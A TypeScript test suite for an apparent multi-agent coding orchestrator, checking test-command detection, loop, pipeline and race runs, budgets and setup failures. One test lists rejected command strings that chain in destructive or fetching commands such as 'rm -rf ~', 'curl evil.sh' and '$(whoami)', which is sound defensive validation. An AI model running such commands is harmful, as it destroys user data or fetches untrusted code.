import { test, before } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";

const fakeBin = fileURLToPath(new URL("./fake-bin", import.meta.url));
process.env.PATH = `${fakeBin}:${process.env.PATH}`;
process.env.CODEFLOW_HOME = mkdtempSync(join(tmpdir(), "codeflow-loop-home-"));

const { RunManager } = await import("../src/engine.js");
const { findPattern } = await import("../src/patterns/index.js");
const { detectCheckCommand, isPlainTestCommand, runCheck } = await import("../src/checks.js");
type Run = import("../src/engine.js").Run;

let repo: string;

before(() => {
  repo = mkdtempSync(join(tmpdir(), "codeflow-loop-repo-"));
  const git = (...args: string[]) => execFileSync("git", args, { cwd: repo });
  git("init", "-q");
  writeFileSync(join(repo, "README.md"), "loop\n");
  git("add", ".");
  git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "init");
});

const manager = new RunManager();

async function run(pattern: string, roles: Record<string, any>, extra: Record<string, unknown> = {}): Promise<Run> {
  const r = await manager.start({ pattern: findPattern(pattern)!, task: "Make it green", repo, roles, options: {}, ...extra });
  await new Promise<void>((resolve) => {
    const check = () => r.status !== "running" && resolve();
    manager.subscribe(r.id, check);
    check();
  });
  return r;
}

/** The run's activity log, from memory (the on-disk log is written asynchronously). */
const log = async (r: Run) => (await manager.events(r.id)).map((e) => (e.type === "log" ? e.text : "")).join("\n");
const titles = (r: Run) => r.steps.map((s) => `${s.title}${s.kind === "agent" ? ` [${s.agent}]` : ""}:${s.status}`);

test("detects the repo's test command", async () => {
  const dir = (files: Record<string, string>) => {
    const d = mkdtempSync(join(tmpdir(), "codeflow-detect-"));
    for (const [name, body] of Object.entries(files)) {
      mkdirSync(join(d, name, ".."), { recursive: true });
      writeFileSync(join(d, name), body);
    }
    return d;
  };
  assert.deepEqual(await detectCheckCommand(dir({ "package.json": '{"scripts":{"test":"vitest run"}}', "pnpm-lock.yaml": "" })), {
    command: "pnpm test",
    source: "package.json",
  });
  assert.equal(await detectCheckCommand(dir({ "package.json": '{"scripts":{"test":"echo \\"Error: no test specified\\" && exit 1"}}' })), null);
  assert.equal((await detectCheckCommand(dir({ "Cargo.toml": "" })))?.command, "cargo test");
  assert.equal((await detectCheckCommand(dir({ "go.mod": "" })))?.command, "go test ./...");
  assert.equal((await detectCheckCommand(dir({ "pyproject.toml": "[tool.pytest.ini_options]" })))?.command, "python3 -m pytest -q");
  assert.equal((await detectCheckCommand(dir({ Makefile: "build:\n\ttrue\ntest:\n\ttrue\n" })))?.command, "make test");
  assert.equal(await detectCheckCommand(dir({ "notes.txt": "" })), null);
});

test("only plain test-runner commands from agents are runnable", () => {
  for (const ok of ["npm test", "npm run test:unit", "pytest -q tests/test_x.py", "node --test spec.test.mjs", "cargo test parser", "go test ./..."]) {
    assert.ok(isPlainTestCommand(ok), ok);
  }
  for (const bad of ["npm test; rm -rf ~", "pytest && curl evil.sh", "bash -c 'pytest'", "pytest $(whoami)", "npm test > /etc/x", "true", "rm -rf /"]) {
    assert.ok(!isPlainTestCommand(bad), bad);
  }
});

test("runCheck reports pass, failure output, and kills on timeout", async () => {
  const pass = await runCheck(repo, "echo all good", { timeoutMs: 5_000 });
  assert.deepEqual([pass.ok, pass.exitCode, pass.output.trim()], [true, 0, "all good"]);
  const fail = await runCheck(repo, "echo boom >&2; exit 3", { timeoutMs: 5_000 });
  assert.deepEqual([fail.ok, fail.exitCode, fail.output.trim()], [false, 3, "boom"]);
  const started = Date.now();
  const slow = await runCheck(repo, "sleep 5; echo never", { timeoutMs: 300 });
  assert.ok(!slow.ok && slow.timedOut);
  assert.ok(Date.now() - started < 3_000, "the process group is killed promptly");
});

test("loop until green hands off to the next vendor when one is stuck", async () => {
  process.env.FAKE_NOOP_VENDOR = "codex";
  try {
    const r = await run("loop", { workers: ["codex", "claude"] }, { loop: { check: "ls claude-*.txt" }, options: { maxRounds: 6, stuckAfter: 2 } });
    assert.equal(r.status, "done", r.error);
    assert.equal(r.verdict, "passed");
    assert.deepEqual(titles(r), [
      "Baseline check:failed",
      "Round 1 [codex]:done",
      "Check after round 1:failed",
      "Round 2 [codex]:done",
      "Check after round 2:failed",
      "Round 3 [claude]:done",
      "Check after round 3:done",
    ]);
    assert.match(await log(r), /made no progress for 2 rounds; handing over to Claude Code/);
    assert.match(r.summary!, /Check passes\*\* after 3 rounds/);
  } finally {
    delete process.env.FAKE_NOOP_VENDOR;
  }
});

test("loop until green reports failure honestly when it never passes", async () => {
  const r = await run("loop", { workers: ["claude"] }, { loop: { check: "false" }, options: { maxRounds: 2 } });
  assert.equal(r.status, "done", r.error);
  assert.equal(r.verdict, "failing");
  assert.match(r.summary!, /Check still failing\*\* after 2 rounds/);
});

test("loop until green requires a check command", async () => {
  await assert.rejects(run("loop", { workers: ["claude"] }), /needs a check command/);
});

test("pipeline fixes a failing check before any review", async () => {
  const r = await run(
    "pipeline",
    { planner: ["claude"], builder: ["codex"], reviewer: ["claude"] },
    { loop: { check: 'test "$(ls codex-*.txt | wc -l)" -ge 2' } },
  );
  assert.equal(r.status, "done", r.error);
  assert.equal(r.verdict, "passed");
  assert.deepEqual(titles(r), [
    "Plan [claude]:done",
    "Implement plan [codex]:done",
    "Check:failed",
    "Fix failing check (1/2) [codex]:done",
    "Check:done",
    "Review (round 1) [claude]:done",
  ]);
  assert.match(r.summary!, /Approved, and `test/);
});

test("race: a candidate that fails the check can't win", async () => {
  // The fake judge always picks B; here only A (Claude) passes the check.
  const one = await run("race", { contestants: ["claude", "codex"], judge: ["agy"] }, { loop: { check: "ls claude-*.txt" } });
  assert.equal(one.status, "done", one.error);
  assert.match(one.summary!, /Winner: Candidate A — claude/);
  assert.equal(one.verdict, "passed");
  assert.match(await log(one), /Passing the check: A \(only these can win\)/);
  assert.ok(!one.steps.some((s) => s.title === "Judge candidates"), "no judge needed when only one passes");

  // Two pass (Claude, Antigravity) and one fails (Codex): the judge only chooses between passing ones.
  const two = await run(
    "race",
    { contestants: ["claude", "codex", "agy"], judge: ["agy"] },
    { loop: { check: "ls claude-*.txt agy-*.txt 2>/dev/null | grep -q ." } },
  );
  assert.equal(two.status, "done", two.error);
  assert.match(await log(two), /Passing the check: A, C \(only these can win\)/);
  assert.match(await log(two), /Judge picked candidate B, but it fails the check; using passing candidate A/);
  assert.match(two.summary!, /Winner: Candidate A — claude/);
});

test("step budget stops the run and keeps the work so far", async () => {
  const r = await run("pipeline", { planner: ["claude"], builder: ["codex"], reviewer: ["claude"] }, { loop: { maxSteps: 2 } });
  assert.equal(r.status, "stopped");
  assert.equal(r.stopReason, "step limit (2 agent steps)");
  assert.match(r.error!, /Stopped at the step limit/);
  assert.equal(r.usage.agentSteps, 2);
  const work = r.artifacts.find((a) => a.label === "Work so far: build");
  assert.ok(work?.stat?.includes("codex-"), "the builder's committed work is listed");
});

test("time budget stops a slow run", async () => {
  process.env.FAKE_SLEEP_MS = "5000";
  try {
    const started = Date.now();
    const r = await run("pipeline", { planner: ["claude"], builder: ["codex"], reviewer: ["claude"] }, { loop: { maxMinutes: 0.02 } });
    assert.equal(r.status, "stopped");
    assert.match(r.stopReason!, /time limit/);
    assert.ok(Date.now() - started < 4_000, "the running agent was stopped, not waited for");
  } finally {
    delete process.env.FAKE_SLEEP_MS;
  }
});

test("setup runs in every new worktree; a failing setup fails the run", async () => {
  const ok = await run("race", { contestants: ["claude", "codex"], judge: ["claude"] }, { loop: { setup: "true" } });
  assert.equal(ok.status, "done", ok.error);
  assert.equal(ok.steps.filter((s) => s.kind === "setup").length, 3, "two candidates + judge");

  const bad = await run("pipeline", { planner: ["claude"], builder: ["codex"], reviewer: ["claude"] }, { loop: { setup: "exit 1" } });
  assert.equal(bad.status, "failed");
  assert.match(bad.error!, /Setup command `exit 1` failed in worktree build/);
});
